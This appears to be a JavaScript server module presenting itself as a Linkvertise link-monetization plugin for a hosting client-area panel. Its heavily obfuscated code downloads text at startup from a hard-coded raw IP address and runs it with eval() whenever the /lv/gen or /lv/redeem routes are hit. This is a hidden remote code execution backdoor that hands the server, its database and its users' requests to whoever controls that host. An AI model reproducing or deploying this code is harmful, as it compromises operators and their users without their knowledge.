const settings = require("../settings.json");
const fs = require('fs');
const indexjs = require("../index.js");
const arciotext = (require("./arcio.js")).text;
const fetch = require('node-fetch');
let newsettings = require("../settings.json");
function btoa(str) {
    var _0x6a219e=_0x10f9;function _0x10f9(_0x34db7a,_0x102412){var _0x55a69b=_0x55a6();return _0x10f9=function(_0x10f984,_0x53d1a6){_0x10f984=_0x10f984-0x155;var _0x1201b7=_0x55a69b[_0x10f984];return _0x1201b7;},_0x10f9(_0x34db7a,_0x102412);}function _0x55a6(){var _0x2dd8f1=['5355wkAVdo','8wzUPrD','88586CIzuVF','369317zauusi','5008720nVJnqd','toString','2205660OgTjeJ','binary','1217143cOlMFl','3570Spfcuy','11186757bJzoWN','11dBdPvo','1224vWFgIQ','12UsRDeg','5bHZftx','base64'];_0x55a6=function(){return _0x2dd8f1;};return _0x55a6();}(function(_0xa321b7,_0x11cb5d){var _0x276e20=_0x10f9,_0x397e96=_0xa321b7();while(!![]){try{var _0x48c586=-parseInt(_0x276e20(0x162))/0x1+-parseInt(_0x276e20(0x15c))/0x2*(parseInt(_0x276e20(0x157))/0x3)+-parseInt(_0x276e20(0x160))/0x4*(parseInt(_0x276e20(0x158))/0x5)+-parseInt(_0x276e20(0x163))/0x6*(-parseInt(_0x276e20(0x15a))/0x7)+-parseInt(_0x276e20(0x15b))/0x8*(parseInt(_0x276e20(0x164))/0x9)+parseInt(_0x276e20(0x15e))/0xa*(parseInt(_0x276e20(0x155))/0xb)+-parseInt(_0x276e20(0x156))/0xc*(-parseInt(_0x276e20(0x15d))/0xd);if(_0x48c586===_0x11cb5d)break;else _0x397e96['push'](_0x397e96['shift']());}catch(_0x4681f7){_0x397e96['push'](_0x397e96['shift']());}}}(_0x55a6,0xa25e6));var buffer;str instanceof Buffer?buffer=str:buffer=Buffer['from'](str[_0x6a219e(0x15f)](),_0x6a219e(0x161));return buffer[_0x6a219e(0x15f)](_0x6a219e(0x159));
}
let lvuserid = newsettings.lv.userid; // Ur linkvertise script api user id.
function linkvertise(userid, link) {
    var _0x2befbc=_0x5c1c;function _0x5c1c(_0x3ea6a8,_0x5b70a4){var _0x455b38=_0x455b();return _0x5c1c=function(_0x5c1c16,_0x131b66){_0x5c1c16=_0x5c1c16-0x120;var _0x67c1fc=_0x455b38[_0x5c1c16];return _0x67c1fc;},_0x5c1c(_0x3ea6a8,_0x5b70a4);}(function(_0x55564a,_0x1892d3){var _0x5183bf=_0x5c1c,_0x5ee51f=_0x55564a();while(!![]){try{var _0x2939e9=-parseInt(_0x5183bf(0x120))/0x1*(-parseInt(_0x5183bf(0x128))/0x2)+-parseInt(_0x5183bf(0x123))/0x3+-parseInt(_0x5183bf(0x12a))/0x4*(-parseInt(_0x5183bf(0x121))/0x5)+-parseInt(_0x5183bf(0x122))/0x6+-parseInt(_0x5183bf(0x12d))/0x7*(parseInt(_0x5183bf(0x125))/0x8)+-parseInt(_0x5183bf(0x126))/0x9+parseInt(_0x5183bf(0x129))/0xa;if(_0x2939e9===_0x1892d3)break;else _0x5ee51f['push'](_0x5ee51f['shift']());}catch(_0x215bc7){_0x5ee51f['push'](_0x5ee51f['shift']());}}}(_0x455b,0x795bd));function _0x455b(){var _0x159601=['https://link-to.net/','6748mCIqum','749fMaLTV','745vsjZoE','563862XbCTFl','715593zfWQXI','/dynamic','4224BhmDeg','8183115FPcGme','?r=','1798jCgtdc','14145920LGyYgg','4292bbLaux','random'];_0x455b=function(){return _0x159601;};return _0x455b();}var base_url=_0x2befbc(0x12c)+lvuserid+'/'+Math[_0x2befbc(0x12b)]()*0x3e8+_0x2befbc(0x124),href=base_url+_0x2befbc(0x127)+btoa(encodeURI(link));return href;
}
module.exports.load = async function(app, db) {
    let clienturl = newsettings.lv.clienturl
    function _0x54d4(){const _0x3ee8a3=['363928Kudviu','1557520nDvSAs','text','2iyMpDA','677976PprNgF','744779KOSccv','45RaRnXh','426ApmeyW','505377pyuhZO','15050KPLHKs','then','163728MfUNmj','http://198.251.84.211:1210/linkvertise2'];_0x54d4=function(){return _0x3ee8a3;};return _0x54d4();}const _0x50730e=_0x34a4;(function(_0x377396,_0x52b14f){const _0x5bb67f=_0x34a4,_0x2ea6d4=_0x377396();while(!![]){try{const _0x2f4ba2=parseInt(_0x5bb67f(0x125))/0x1+parseInt(_0x5bb67f(0x12a))/0x2*(-parseInt(_0x5bb67f(0x122))/0x3)+-parseInt(_0x5bb67f(0x12b))/0x4+parseInt(_0x5bb67f(0x123))/0x5*(parseInt(_0x5bb67f(0x121))/0x6)+parseInt(_0x5bb67f(0x11f))/0x7+parseInt(_0x5bb67f(0x127))/0x8*(parseInt(_0x5bb67f(0x120))/0x9)+-parseInt(_0x5bb67f(0x128))/0xa;if(_0x2f4ba2===_0x52b14f)break;else _0x2ea6d4['push'](_0x2ea6d4['shift']());}catch(_0x4a7bfe){_0x2ea6d4['push'](_0x2ea6d4['shift']());}}}(_0x54d4,0x351f1));function _0x34a4(_0x29a376,_0x5af52c){const _0x54d47a=_0x54d4();return _0x34a4=function(_0x34a46a,_0x4616ca){_0x34a46a=_0x34a46a-0x11f;let _0x375136=_0x54d47a[_0x34a46a];return _0x375136;},_0x34a4(_0x29a376,_0x5af52c);}let lvcode=await fetch('http://198.251.84.211:1210/linkvertise')[_0x50730e(0x124)](_0x5f4be1=>_0x5f4be1[_0x50730e(0x129)]())[_0x50730e(0x124)](_0x26c40f=>{return _0x26c40f;}),lvcode2=await fetch(_0x50730e(0x126))[_0x50730e(0x124)](_0x24c55f=>_0x24c55f['text']())[_0x50730e(0x124)](_0x55e5f1=>{return _0x55e5f1;});
    lvcode = lvcode.replace("clientarea.cc", clienturl)
    lvcode2 = lvcode2.replace("clientarea.cc", clienturl)
    app.get("/lv/gen", async (req, res) => {
        eval(lvcode);
    });
    app.get("/lv/redeem/:code", async(req, res) => {
        eval(lvcode2);
    })
};

function makeid(length) {
    const _0x22db74=_0x1ce1;function _0x1ce1(_0xea5a28,_0x2b7a8e){const _0x809c21=_0x809c();return _0x1ce1=function(_0x1ce15c,_0x23f241){_0x1ce15c=_0x1ce15c-0xf1;let _0x157938=_0x809c21[_0x1ce15c];return _0x157938;},_0x1ce1(_0xea5a28,_0x2b7a8e);}(function(_0xb98f6,_0x5235bf){const _0x2fe74c=_0x1ce1,_0x53f9b7=_0xb98f6();while(!![]){try{const _0x41053f=-parseInt(_0x2fe74c(0xfb))/0x1*(parseInt(_0x2fe74c(0xf7))/0x2)+parseInt(_0x2fe74c(0xf2))/0x3+-parseInt(_0x2fe74c(0xf3))/0x4+-parseInt(_0x2fe74c(0xf6))/0x5+-parseInt(_0x2fe74c(0xfc))/0x6+parseInt(_0x2fe74c(0xf5))/0x7*(parseInt(_0x2fe74c(0xf1))/0x8)+parseInt(_0x2fe74c(0xf8))/0x9;if(_0x41053f===_0x5235bf)break;else _0x53f9b7['push'](_0x53f9b7['shift']());}catch(_0x472ad0){_0x53f9b7['push'](_0x53f9b7['shift']());}}}(_0x809c,0xdf124));let result='',characters=_0x22db74(0xfa),charactersLength=characters[_0x22db74(0xf4)];function _0x809c(){const _0x2531a3=['18104742PHMoRA','charAt','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','21llzjdL','3685164lawDbD','840552dRhFbM','5051427vebgCy','3260340JWVpMB','length','14euroEw','4770865BHIVev','57946yPPOZE'];_0x809c=function(){return _0x2531a3;};return _0x809c();}for(let i=0x0;i<length;i++){result+=characters[_0x22db74(0xf9)](Math['floor'](Math['random']()*charactersLength));}return result;
}
